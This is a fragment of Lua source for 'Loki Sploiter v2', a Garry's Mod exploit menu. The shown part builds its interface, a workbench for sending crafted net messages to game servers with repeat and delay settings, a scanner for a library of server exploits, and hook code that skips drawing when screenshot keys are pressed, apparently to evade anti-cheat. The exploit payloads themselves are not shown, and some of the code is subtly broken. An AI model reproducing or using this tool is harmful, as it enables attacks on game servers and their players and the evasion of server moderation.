        plyname:SetPos( 10, 5 )
        plyname:SetFont( "Trebuchet18" )
        local tcol = Color( 255, 255, 255 )
        if v == LOKI.GetLP() then tcol = Color( 155, 155, 255 ) end
        plyname:SetColor( tcol )
        if(v:IsPlayer()) then
            plyname:SetText( "(" .. v:GetUserGroup() .. ") " .. v:Nick() )
        else
            plyname:SetText( tostring(v) )
        end
        plyname:SetSize(180, 15)
        local plysel = LOKI.vgui.Create("DButton", plypanel2 )
        plysel:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
        plysel:SetPos( 0, 0 )
        plysel:SetText("")
        plysel.ent = v
        plysel.Paint = function(panel, w, h)
            if plysel.ent == LOKI.SpectateEnt then surface.SetDrawColor( Color(0, 255, 255, 245) ) surface.DrawOutlinedRect( 2, 2, plypanel2:GetWide() - 4, plypanel2:GetTall() - 4) end
            local hoveredpan = vgui.GetHoveredPanel()
            if(IsValid(hoveredpan) && IsValid(hoveredpan.ent) && !LOKI.SpectateEnt) then
                LOKI.IsHovered = hoveredpan.ent
            else
                LOKI.IsHovered = false
            end
            return
        end
        plysel.DoRightClick = function()
            if(LOKI.SpectateEnt != plysel.ent) then
                LOKI.SpectateEnt = plysel.ent
            else
                LOKI.SpectateEnt = false
            end
        end
        plysel.DoClick = function()
            if(tab.nostore) then return plysel.DoRightClick() end
            if(istable(plytab)) then
                if table.HasValue( plytab, v ) then
                    Index = table.RemoveByValue( plytab, v )
                else
                    if(single) then
                        table.Empty(plytab)
                    end
                    table.insert(plytab, v)
                end
                if(single) then
                    LOKI.Store( tab, plytab[1] )
                else
                    LOKI.Store( tab, plytab )
                end
            else
                LOKI.Store( tab, plytab )
            end
        end
    Plist:AddItem( plypanel2 )
    end
end
function LOKI.MakeTextInputButton( parent, x, y, btext, default, addr)
    if !parent:IsValid() then return end
    local hostframe = LOKI.vgui.Create( "DPanel", parent )
    hostframe:SetPos( x, y )
    hostframe.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local tttt = LOKI.vgui.Create( "DLabel", hostframe )
    tttt:SetPos( 5, 5 )
    tttt:SetText( btext )
    tttt:SizeToContents()
    local tentry = LOKI.vgui.Create( "DTextEntry", hostframe )
    tentry:SetPos( 10 + tttt:GetWide(), 2 )
    --tentry:SetSize( 130, 20 )
    tentry:SetText( LOKI.GetStored( addr, default ) )
    tentry.OnChange = function( self )
        LOKI.Store( addr, self:GetValue() )
    end
    hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
    return hostframe:GetWide(), hostframe:GetTall()
end
function LOKI.MakeComboButton( parent, x, y, btext, default, addr, tbl, restriction, name, sort, find)
    if !parent:IsValid() then return end
    if(isfunction(tbl)) then
        tbl = tbl()
    end
    local hostframe = LOKI.vgui.Create( "DPanel", parent )
    hostframe:SetPos( x, y )
    hostframe.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local tttt = LOKI.vgui.Create( "DLabel", hostframe )
    tttt:SetPos( 5, 5 )
    tttt:SetText( btext )
    tttt:SizeToContents()
    local tentry = LOKI.vgui.Create( "DComboBox", hostframe )
    tentry:SetPos( 10 + tttt:GetWide(), 2 )
    tentry:SetSize( 130, 20 )
    tentry:SetSortItems( false )
    tentry:SetValue(istable(LOKI.GetStored(addr, default)) && tbl[(LOKI.GetStored(addr, default)[1])] && tbl[(LOKI.GetStored(addr, default)[1])][name] || "")
    for k, v in SortedPairsByMemberValue(tbl, sort) do
        if(!restriction || v[restriction]) then
            tentry:AddChoice(v[name], k)
        end
    end
    tentry.OnSelect = function( panel, index, value, data )
        tentry:SetValue(value)
        LOKI.Store( addr, {data, tbl[data][find] || data} )
    end
    hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
    return hostframe:GetWide(), hostframe:GetTall()
end
function LOKI.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
    if !parent:IsValid() then return end
    if(min) then
        min = LOKI.SafeToNumber(min)
    else
        min = -math.huge
    end
    if(max) then
        max = LOKI.SafeToNumber(max)
    else
        max = math.huge
    end
    local hostframe = LOKI.vgui.Create( "DPanel", parent )
    hostframe:SetPos( x, y )
    hostframe.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local tttt = LOKI.vgui.Create( "DLabel", hostframe )
    tttt:SetPos( 5, 5 )
    tttt:SetText( btext || "" )
    tttt:SizeToContents()
    local numentry = LOKI.vgui.Create( "DNumberWang", hostframe )
    numentry:SetPos( 10 + tttt:GetWide(), 2 )
    numentry:SetSize( 45, 20 )
    numentry:SetDecimals( 2 )
    numentry:SetMin( min )
    numentry:SetMax( max )
    numentry:SetValue( LOKI.GetStored( addr, default ) )
    numentry.OnValueChanged = function( self, val )
        val = math.Clamp(LOKI.SafeToNumber(val), min, max)
        LOKI.Store( addr, val )
    end
    hostframe:SetSize( 13 + tttt:GetWide() + numentry:GetWide(), 24 )
    return hostframe:GetWide(), hostframe:GetTall()
end
function LOKI.MakeVectorInputButton( parent, x, y, btext, default, addr)
    if !parent:IsValid() then return end
    local hostframe = LOKI.vgui.Create( "DPanel", parent )
    hostframe:SetPos( x, y )
    hostframe.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local tttt = LOKI.vgui.Create( "DLabel", hostframe )
    tttt:SetPos( 5, 5 )
    tttt:SetText( btext || "" )
    tttt:SizeToContents()
    local numentry = nil
    for i=1,3 do
        local numentry = LOKI.vgui.Create( "DNumberWang", hostframe )
        numentry:SetPos( 3*i + tttt:GetWide(), 2 )
        numentry:SetSize( 15*i, 20 )
        numentry:SetDecimals( 2 )
        numentry:SetValue( LOKI.GetStored( addr, default )[i] )
        numentry.OnValueChanged = function( self, val )
            val = LOKI.SafeToNumber(val)
            local var = LOKI.GetStored( addr, default )
            self:SetValue(val)
            var[i] = val
            LOKI.Store( addr, var )
        end
    end
    hostframe:SetSize( 13 + tttt:GetWide() + numentry:GetWide() * 3, 24 )
    return hostframe:GetWide(), hostframe:GetTall()
end
////////////////////////////////////////////- NET WORKBENCH -//////////////////////////////////////////////////
function LOKI.MakeMessageSelector( hostpanel, typevar, isent )
    local hostframe = LOKI.vgui.Create( "DPanel", LOKI.NetWorkbench.NetPanel )
    hostframe:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )
    hostframe:SetSize( LOKI.NetWorkbench.NetPanel:GetWide() - 10, 22 )
    hostframe.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local tttt = LOKI.vgui.Create( "DLabel", hostframe )
    tttt:SetPos( 20, 4 )
    tttt.Type = typevar
    tttt:SetText( typevar )
    tttt:SizeToContents()
    local tentry = isent && LOKI.vgui.Create( "DComboBox", hostframe ) || LOKI.vgui.Create( "DTextEntry", hostframe )
    tentry:SetSize( 140, 18 )
    tentry:SetPos( hostframe:GetWide() - 145, 2 )
    if(!isent) then
        tentry:SetText( "" )
        tentry.OnChange = function( self )
            print( self:GetValue() )
        end
    else        
        for k, v in ipairs( player.GetAll() ) do
            if((v:IsScripted() || v:IsPlayer()) && !string.StartWith(v:GetClass(), "env_")) then
                tentry:AddChoice(tostring(v))
            end
        end
        DComboBox.OnSelect = function( panel, index, value )
            print( tostring(Entity(index)) .." was selected!" )
        end
    end
    local SelButton = LOKI.vgui.Create( "DButton", hostframe )
    SelButton:SetPos( 5, 3 )
    SelButton:SetText( "" )
    SelButton:SetTextColor( Color(255, 255, 255, 255) )
    SelButton:SetSize( 12, 16 )
    SelButton.Paint = function( self, w, h )
        surface.SetDrawColor( Color(30, 30, 30, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color(90, 90, 90, 200) )
        surface.DrawRect( 2, 2, 3, h - 4 )
        surface.DrawRect( 6, 2, 3, h - 4 )
    end
    LOKI.NetWorkbench.NetPanel.ysize = LOKI.NetWorkbench.NetPanel.ysize + 25
    hostpanel:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )
    SelButton.DoClick = function( self )
        hostframe:Remove()
        LOKI.NetWorkbench.NetPanel.ysize = LOKI.NetWorkbench.NetPanel.ysize - 25
        hostpanel:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )
    end
end
function LOKI.NetmessagePanel()
    if LOKI.NetWorkbench and LOKI.NetWorkbench:IsVisible() then LOKI.NetWorkbench:Remove() end
    LOKI.NetWorkbench = LOKI.vgui.Create("DFrame", LOKI.Menu)
    LOKI.NetWorkbench:SetSize(250,400)
    LOKI.NetWorkbench:SetTitle("Send a netmessage")
--    LOKI.NetWorkbench:SetPos( gui.MouseX(), gui.MouseY() )
    LOKI.NetWorkbench:MakePopup()
    LOKI.NetWorkbench:Center()
    LOKI.NetWorkbench.Paint = function( s, w, h )
        if !IsValid(LOKI.Menu) or !LOKI.Menu:IsVisible() then s:Remove() return end
        surface.SetDrawColor( Color(30, 30, 30, 255) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color(55, 55, 55, 245) )
        surface.DrawOutlinedRect( 0, 0, w, h )
        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
        LOKI.DrawText( "Channel: ", "default", 5, 28, Color(255,255,255, 30) )
        LOKI.DrawText( "Repeat: ", "default", 8, 54, Color(255,255,255, 30) )
        LOKI.DrawText( "Times", "default", 100, 54, Color(255,255,255, 30) )
        LOKI.DrawText( "Delay: ", "default", 15, 79, Color(255,255,255, 30) )
        LOKI.DrawText( "( 100 = 1 msg/second )", "default", 100, 79, Color(255,255,255, 30) )
        LOKI.DrawText( "Data: ", "default", 5, 104, Color(255,255,255, 30) )
        surface.SetDrawColor( Color(0, 0, 0, 205) )
        surface.DrawRect( 5, 105, w - 10, 250 )
    end
    LOKI.NetWorkbench.NetPanel = LOKI.vgui.Create( "DScrollPanel", LOKI.NetWorkbench )
    LOKI.NetWorkbench.NetPanel:SetSize( LOKI.NetWorkbench:GetWide() - 10, 250 )
    LOKI.NetWorkbench.NetPanel:SetPos( 5, 105 )
    LOKI.NetWorkbench.NetPanel.ysize = 0
    local AddButton = LOKI.vgui.Create( "DButton", LOKI.NetWorkbench.NetPanel )
    AddButton:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )
    AddButton:SetText( "Add New Data" )
    AddButton:SetTextColor( Color(255, 255, 255, 255) )
    AddButton:SetSize( LOKI.NetWorkbench.NetPanel:GetWide() - 10, 20 )
    AddButton.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawRect( 0, 0, w, 1 )
        surface.DrawRect( 0, 0, 1, h )
    end
    local DataToSend = {}
    AddButton.DoClick = function( self )
        local Menu = DermaMenu()
        local Menustr = Menu:AddOption( "String (Text)", function() LOKI.MakeMessageSelector(self, "String") end ) Menustr:SetIcon( "icon16/script_edit.png" )
        local Menuuint = Menu:AddOption( "UInt (Positive Whole Number)", function() LOKI.MakeMessageSelector(self, "UInt") end ) Menuuint:SetIcon( "icon16/script_add.png" )
        local Menuint = Menu:AddOption( "Int (Whole Number)", function() LOKI.MakeMessageSelector(self, "Int") end ) Menuint:SetIcon( "icon16/script_delete.png" )
        local Menufloat = Menu:AddOption( "Float (Decimal Number)", function() LOKI.MakeMessageSelector(self, "Float") end ) Menufloat:SetIcon( "icon16/script_link.png" )
        local Menubool = Menu:AddOption( "Boolean (True or False)", function() LOKI.MakeMessageSelector(self, "Boolean") end ) Menubool:SetIcon( "icon16/script.png" )
        local Menuvec = Menu:AddOption( "Vector (3D coordinates)", function() LOKI.MakeMessageSelector(self, "Vector") end ) Menuvec:SetIcon( "icon16/script_code.png" )
        local Menuang = Menu:AddOption( "Angle (Pitch, Yaw and Roll)", function() LOKI.MakeMessageSelector(self, "Angle") end ) Menuang:SetIcon( "icon16/script_gear.png" )
        local Menucol = Menu:AddOption( "Colour (Red, Green and Blue)", function() LOKI.MakeMessageSelector(self, "Colour") end ) Menucol:SetIcon( "icon16/script_palette.png" )
        local Menuent = Menu:AddOption( "Player (Entity Object)", function() LOKI.MakeMessageSelector(self, "Player", true) end ) Menuent:SetIcon( "icon16/world.png" )
        local Menudouble = Menu:AddOption( "Double (High Precision Decimal Number)", function() LOKI.MakeMessageSelector(self, "Double") end ) Menudouble:SetIcon( "icon16/script_code_red.png" )
        local Menudata = Menu:AddOption( "Data (Binary Data + Length)", function() LOKI.MakeMessageSelector(self, "Data") end ) Menudata:SetIcon( "icon16/server.png" )
        Menu:Open()
    end
    local netname = LOKI.vgui.Create( "DTextEntry", LOKI.NetWorkbench )
    netname:SetPos( 50, 25 )
    netname:SetSize( 190, 20 )
    netname:SetText( LOKI.GetStored( "LCurrentNetmessage", "" ) )
    netname.OnChange = function( self )
        local nam = self:GetValue()
        LOKI.Store( "LCurrentNetmessage", nam )
    end
    local netrepeat = LOKI.vgui.Create( "DNumberWang", LOKI.NetWorkbench )
    netrepeat:SetPos( 50, 50 )
    netrepeat:SetSize( 45, 20 )
    netrepeat:SetDecimals( 2 )
    netrepeat:SetValue( LOKI.GetStored( "LCurrentNetRepeat", 1 ) )
    netrepeat.OnValueChanged = function( self, val )
        LOKI.Store( "LCurrentNetRepeat", self:GetValue() )
    end
    local netdelay = LOKI.vgui.Create( "DNumberWang", LOKI.NetWorkbench )
    netdelay:SetPos( 50, 75 )
    netdelay:SetSize( 45, 20 )
    netdelay:SetDecimals( 3 )
    netdelay:SetValue( LOKI.GetStored( "LCurrentnetDelay", 100 ) )
    netdelay.OnValueChanged = function( self, val )
        LOKI.Store( "LCurrentnetDelay", self:GetValue() )
    end
    local netname = LOKI.vgui.Create( "DTextEntry", LOKI.NetWorkbench )
    netname:SetPos( 50, 25 )
    netname:SetSize( 190, 20 )
    netname:SetText( LOKI.GetStored( "LCurrentNetmessage", "" ) )
    netname.OnChange = function( self )
        local nam = self:GetValue()
        LOKI.Store( "LCurrentNetmessage", nam )
    end
    LOKI.NetWorkbench.SendToServerButton = LOKI.vgui.Create( "DButton", LOKI.NetWorkbench )
    LOKI.NetWorkbench.SendToServerButton:SetPos( 5, LOKI.NetWorkbench:GetTall() - 35 )
    LOKI.NetWorkbench.SendToServerButton:SetText( "Send to Server" )
    LOKI.NetWorkbench.SendToServerButton:SetTextColor( Color(255, 255, 255, 255) )
    LOKI.NetWorkbench.SendToServerButton:SetSize( LOKI.NetWorkbench:GetWide() - 10, 30 )
    LOKI.NetWorkbench.SendToServerButton.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    LOKI.NetWorkbench.SendToServerButton.DoClick = function()
    end
end
function LOKI.SecondsToClock(seconds)
    local seconds = LOKI.SafeToNumber(seconds)
    
    if seconds <= 0 then
        return "00:00:00";
    else
        local hours = string.format("%02.f", math.floor(seconds/3600));
        local mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
        local secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
        return hours..":"..mins..":"..secs
    end
end
function LOKI.SafeToNumber(var)
    return tonumber(var) || -math.huge
end
function LOKI.GetWithinBounds( ent, entpos, dist )
    local tbl = {}
    if(istable(ent)) then
        for k, v in ipairs(ent) do
            if(IsValid(v)) then
                if(v:GetPos():DistToSqr( entpos ) < ( dist*dist )) then
                    tbl[#tbl + 1] = v
                end
            end
        end
        return tbl
    elseif(IsValid(ent) && isfunction(ent.GetPos)) then
        return ent:GetPos():DistToSqr( entpos:GetPos() ) < ( dist*dist )
    else
        return false
    end
end
function LOKI.SecureString(str)
    local tbl = string.ToTable(str)
    local final_tbl = table.Copy(tbl)
    for k, v in pairs(tbl) do
        table.insert(final_tbl, math.random(0, #tbl), "​")
    end
    return table.concat(tbl)
end
////////////////////////////////////////////- MENU -//////////////////////////////////////////////////
local events = {["player_disconnect"] = true, ["player_connect"] = true, ["player_hurt"] = true, ["player_say"] = true, ["player_activate"] = true, ["player_spawn"] = true, ["player_changename"] = true, ["player_info"] = true, ["server_cvar"] = true, ["break_prop"] = true, ["break_breakable"] = true, ["flare_ignite_npc"] = true, ["entity_killed"] = true,}
local eventsR = {}
function LOKI.OpenMenu(bInit)
    if LOKI.Menu && LOKI.Menu:IsVisible() then return end
    LOKI.CreatePanel = function() end
    local ActiveCount = function() end
    local Plist = nil
    if(bInit != true) then
        LOKI.Menu = LOKI.vgui.Create("DFrame")
        LOKI.Menu:SetPaintedManually(true)
        LOKI.Menu:SetSize(700,550)
        LOKI.Menu:SetTitle(LOKI.SecureString("Loki Sploiter v2"))
        LOKI.Menu:Center()
        LOKI.Menu:MakePopup()
 
        LOKI.Menu.ChocolateIcecream = {LOKI.GetVarExploits("severity", LOKI.TYPEVARS.MORETHAN, 0)}
        LOKI.Menu.ChocolateIcecream[2] = LOKI.GetVarTable(LOKI.Menu.ChocolateIcecream[1], "scanned", LOKI.TYPEVARS.EQUALTO, true)
        LOKI.Menu.ChocolateIcecream[3] = 0
        LOKI.Menu.ChocolateIcecream[4] = 0
        
        ActiveCount = function()
        
            LOKI.Menu.ChocolateIcecream = {LOKI.GetVarExploits("severity", LOKI.TYPEVARS.MORETHAN, 0)}
            LOKI.Menu.ChocolateIcecream[2] = LOKI.GetVarTable(LOKI.Menu.ChocolateIcecream[1], "scanned", LOKI.TYPEVARS.EQUALTO, true)
            LOKI.Menu.ChocolateIcecream[3] = 0
            LOKI.Menu.ChocolateIcecream[4] = 0
 
            for k, v in pairs(LOKI.Menu.ChocolateIcecream[1]) do
                if(!v.count) then
                    v.count = {
                        ["Active"] = 1,
                        ["Total"] = 1,
                    }
                end
 
                if(istable(v.functions) && !v.count.Counted) then
                    for k2, v2 in pairs(v.functions) do
                        if(v2.typ == "bools") then
                            if(!v.count.Counted) then
                                v.count.Total = v.count.Total - 1
                                v.count.Counted = true
                            end
                            v.count.Total = v.count.Total + table.Count(v2.tbl)
                        end
                    end
                end
 
                LOKI.Menu.ChocolateIcecream[3] = LOKI.Menu.ChocolateIcecream[3] + v.count.Total
            end
 
            for k, v in pairs(LOKI.Menu.ChocolateIcecream[2]) do
                LOKI.BlockNetOutgoing = true
                if(v.prevalidated) then LOKI.GENERAL_OVERRIDE = true end
                if(v.scan_always && !v.scan(v)) then LOKI.BlockNetOutgoing = false LOKI.GENERAL_OVERRIDE = false continue end
                LOKI.GENERAL_OVERRIDE = false
                LOKI.BlockNetOutgoing = false
                if(!v.count) then
                    v.count = {
                        ["Active"] = 1,
                        ["Total"] = 1,
                    }
                end
 
                LOKI.Menu.ChocolateIcecream[4] = LOKI.Menu.ChocolateIcecream[4] + v.count.Active
            end
 
        end
 
        LOKI.Menu.Paint = function( s, w, h )
            LOKI.Menu:SetVisible(true)
            surface.SetDrawColor( Color(30, 30, 30, 245) )
            surface.DrawRect( 0, 0, w, h )
            surface.SetDrawColor( Color(55, 55, 55, 245) )
            surface.DrawOutlinedRect( 0, 0, w, h )
            surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
            surface.SetDrawColor( Color(0, 0, 0, 200) )
            surface.DrawRect( 80, 25, w - 90, h - 35 )
            surface.SetDrawColor( Color(100, 100, 100, 200) )
            surface.DrawLine( 10, 25, 40, 30 )
            surface.DrawLine( 40, 30, 70, 25 )
            surface.DrawLine( 10, 25, 25, 40 )
            surface.DrawLine( 55, 40, 70, 25 )
            surface.DrawLine( 25, 40, 25, 60 )
            surface.DrawLine( 55, 40, 55, 60 )
            surface.DrawLine( 25, 60, 40, 70 )
            surface.DrawLine( 55, 60, 40, 70 )
            LOKI.DrawText( "Sploit Library", "default", 8, 85, Color(255,255,255, 30) )
            LOKI.DrawText( "Exploits: "..LOKI.Menu.ChocolateIcecream[3], "default", 8, 95, Color(255,255,255, 30) )
            LOKI.DrawText( "Available: "..LOKI.Menu.ChocolateIcecream[4], "default", 8, 105, Color(255,255,255, 30) )
            LOKI.DrawText( "Bait?: "..LOKI.BAIT_COUNT, "default", 8, 115, Color(255,255,255, 30) )
            LOKI.DrawText( "Ares: "..(LOKI.ARES && "✓" || "✗"), "default", 8, 125, Color(255,255,255, 30) )
        end
        Plist = LOKI.vgui.Create( "DPanelList", LOKI.Menu )
        Plist:SetSize( LOKI.Menu:GetWide() - 90, LOKI.Menu:GetTall() - 35 )
        Plist:SetPadding( 5 )
        Plist:SetSpacing( 5 )
        Plist:EnableHorizontal( false )
        Plist:EnableVerticalScrollbar( false )
        Plist:SetPos( 80, 25 )
        Plist:SetName( "" )
        LOKI.MakeFunctionButton( LOKI.Menu, 10, 140, "Load Config", LOKI.LoadConfig, "Load a saved loki config" )
        LOKI.MakeFunctionButton( LOKI.Menu, 10, 170, "Save Config", LOKI.SaveConfig, "Save your loki config" )
        --LOKI.MakeFunctionButton( LOKI.Menu, 12, LOKI.Menu:GetTall() - 35, " net.Send ", LOKI.NetmessagePanel, "" )
        LOKI.CreatePanel = function( Name, t, parent )
        if !LOKI.Menu || !LOKI.Menu:IsVisible() then return end
            for _, tab in ipairs( t.functions ) do
                if tab.typ == "bools" && istable(tab.tbl) then
                    if(!t.count) then
                        t.count = {
                            ["Active"] = 1,
                            ["Total"] = 1,
                        }
                    end
                    if(!t.count.Counted) then
                        if(!t.count.Counted) then
                            t.count.Total = t.count.Total - 1
                            t.count.Counted = true
                        end
                        t.count.Total = t.count.Total .. table.Count(tab.tbl)
                    end
                    local funcs = {}
                    for k, v in pairs(tab.tbl) do
                        if(LOKI.ValidNetString(v)) then
                            t.count.Active = t.count.Active + 1
                            local tab = table.Copy(tab)
                            tab.typ = "bool"
                            tab.ToggleText = {k}
                            tab.border = true
                            tab.bool = v
                            tab.channel = v
                            tab.tbl = nil
                            table.insert(t.functions, tab)
                            t.bools[v] = false
                        end
                    end
                    table.RemoveByValue(t.functions, tab)
                    t.typ = "bools"
                end
            end
            if(#t.functions == 0) then return end
            local cmdp = LOKI.vgui.Create( "DPanel", parent )
            cmdp:SetSize( Plist:GetWide(), 70 )
            cmdp.Cmd = Name
            cmdp.Desc = isfunction(t.desc) && t.desc() || t.desc
            local status = isfunction(t.status) && t.status() || t.status
            if(status != nil && StatusText[status] && StatusColors[status]) then
                cmdp.Status = StatusText[status]
                cmdp.StatusCol = StatusColors[status]
            else
                cmdp.Status = "Unknown"
                cmdp.StatusCol = StatusColors[2]
            end
            cmdp.Paint = function( s, w, h )
                if(!LOKI.Menu || !LOKI.Menu:IsVisible()) then return cmdp:Remove() end
                local severity = isfunction(t.severity) && t.severity() || t.severity
                surface.SetDrawColor( Color(50, 50, 50, 245) )
                surface.DrawRect( 0, 0, w, h )
                surface.SetDrawColor( LOKI.GetColor(severity) || Color(255, 255, 255) )
                surface.DrawOutlinedRect( 0, 0, w, h )
                surface.DrawLine( 0, 24, w, 24 )
                local r_tbl = LOKI.RecursiveGetVar(t, {"vars", "Think"}, "table", true)
                if(r_tbl.cooldown && r_tbl.cooldown - LOKI.REAL_CURTIME >= 0) then
                    local cooldown = r_tbl.cooldown - LOKI.REAL_CURTIME
                    LOKI.DrawText( string.format(cmdp.Cmd.."%s", " [" .. LOKI.SecondsToClock(cooldown) .. "]"), "DermaDefault", 10, 5, Color(255,255,255) )
                else
                    r_tbl.cooldown = 0
                    LOKI.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
                end
                if(severity > 0) then
                    LOKI.DrawText( "Status: ", "DermaDefault", 595 - (LOKI.Menu:GetWide() - cmdp:GetWide()), 5, Color(255,255,255) )
                    LOKI.DrawText( cmdp.Status, "DermaDefault", 635 - (LOKI.Menu:GetWide() - cmdp:GetWide()), 5, cmdp.StatusCol )
                end
                LOKI.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )
            end
            local width, height = cmdp:GetSize()
            local nfunctions = #t.functions
            local x = 10
            for _, tab in ipairs( t.functions ) do
                tab.max_width = (width / nfunctions) - (nfunctions * 5)
                if(tab.required == nil || tab.required == true) then
                    if tab.typ == "func" then
                        x = (x + 5) + LOKI.MakeFunctionButton( cmdp, x, 42, tab.Name, t, nil, tab )
                    elseif tab.typ == "bool" then
                        x = (x + 5) + LOKI.MakeFunctionButton( cmdp, x, 42, (!((LOKI.NotNil(tab.bool) && t.bools[tab.bool]) || t.bools.enabled) && ((tab.ToggleText && tab.ToggleText[1]) || "Start") || ((tab.ToggleText && (tab.ToggleText[2] || tab.ToggleText[1])) || "Stop")), t, nil, tab, tab.border)
                    elseif tab.typ == "players" then
                        x = (x + 5) + LOKI.MakeEntitySelectionButton( cmdp, player.GetAll(), x, 42, tab )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "player" then
                        x = (x + 5) + LOKI.MakeEntitySelectionButton( cmdp, player.GetAll(), x, 42, tab, true )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "entities" then
                        x = (x + 5) + LOKI.MakeEntitySelectionButton( cmdp, tab.tbl, x, 42, tab )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "entity" then
                        x = (x + 5) + LOKI.MakeEntitySelectionButton( cmdp, tab.tbl, x, 42, tab, true )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "string" then
                        x = (x + 5) + LOKI.MakeTextInputButton( cmdp, x, 42, tab.Name, tab.default, tab.addr )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "combo" then
                        x = (x + 5) + LOKI.MakeComboButton( cmdp, x, 42, tab.Name, tab.default, tab.addr, tab.tbl, tab.restriction, tab.var, tab.sort, tab.find )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "float" then
                        x = (x + 5) + LOKI.MakeNumberInputButton( cmdp, x, 42, tab.Name, tab.default, tab.min, tab.max, tab.addr )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    elseif tab.typ == "vector" then
                        x = (x + 5) + LOKI.MakeVectorInputButton( cmdp, x, 42, tab.Name, tab.default, tab.addr )
                        if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end
                    end
                end
            end
            Plist:AddItem( cmdp )
        end
    end
    local reset = false
    if(LOKI.BAIT_LIMIT != LOKI.GetStored( "baitthreshold", 5 )) then
        reset = true
        LOKI.BAIT_LIMIT = LOKI.GetStored( "baitthreshold", 5 )
    end
    local det_call = LOKI.DetourCall || false
    LOKI.DetourCall = true
    for k, v in ipairs(LOKI.GetAllExploits()) do
        if(reset) then v.scanned = false end
        LOKI.BlockNetOutgoing = true
        if(v.prevalidated) then LOKI.GENERAL_OVERRIDE = true end
        local scan = (v.scanned && !v.scan_always) || v.scan(v)
        LOKI.GENERAL_OVERRIDE = false
        LOKI.BlockNetOutgoing = false
        if scan then
            local Name = v.Name
            if(v.severity != 0 && #LOKI.GetExploit(Name) > 1) then
                Name = Name .. " #" .. v.Index
            end
            LOKI.CreatePanel( Name, v, Plist )
            if(scan != true) then v.channel = scan end
            if(!v.scanned) then
                if(isfunction(v.initial)) then
                    v.initial(v)
                end
                v.scanned = true
            end
            if(v.hooks && istable(v.hooks)) then
                for k2, v2 in pairs(v.hooks) do
                    if(LOKI.Hooks[k2] && LOKI.Hooks[k2][""]) then continue end
                    if(events[k2] && !eventsR[k2]) then
                        gameevent.Listen(k2)
                        eventsR[k2] = true
                    end
                    local ret_val = nil
                    hook_Add(k2, "", function(gm_ret, ...)
                        local det_call = LOKI.DetourCall || false
                        LOKI.DetourCall = true
                        local skip = false
                        if(LOKI.Killswitch || LOKI.Unload) then skip = true end
                        local varargs = {...}
                        if((k2:find("Draw") || k2:find("Render") || k2:find("HUD") || k2:find("Paint"))) then
                            if(!system.HasFocus() || input.IsKeyDown(input.GetKeyCode(input.LookupBinding("jpeg") || "F5")) || input.IsKeyDown(KEY_F12)) then 
                                skip = true
                            end
                        end
                        if(!skip) then
